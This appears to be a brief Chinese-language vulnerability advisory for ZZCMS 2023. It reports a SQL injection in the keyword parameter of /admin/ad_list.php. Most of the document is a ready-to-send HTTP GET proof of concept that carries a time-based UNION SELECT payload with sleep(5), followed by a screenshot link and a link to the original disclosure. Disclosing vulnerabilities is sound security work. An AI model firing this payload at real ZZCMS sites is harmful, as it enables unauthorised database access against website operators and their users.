# zzcms系统接口ad_list.php存在SQL注入漏洞

ZZCMS 2023是一款快速建站系统，产品招商模板程序源码，可以快速搭建产品招商网。例如医药招商、保健品招商、化妆品招商、农产品招商、孕婴童招商、酒类副食品等。 /admin/ad_list.php组件中关键字过滤导致sql注入漏洞

## poc

```javascript
GET /admin/ad_list.php?action=pass&&keyword='+union+SELECT+1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,sleep(5)+--+x HTTP/1.1
Host: 127.0.0.1:8888
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Cookie: http304ok=0; PHPSESSID=pvpehubud7epklbme9m4s69b0q;
Connection: close
```

![image-20250124101147558](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202501241011639.png)

## 漏洞来源

- https://github.com/En0t5/vul/blob/main/zzcms/zzcms-add_list-sql-inject.md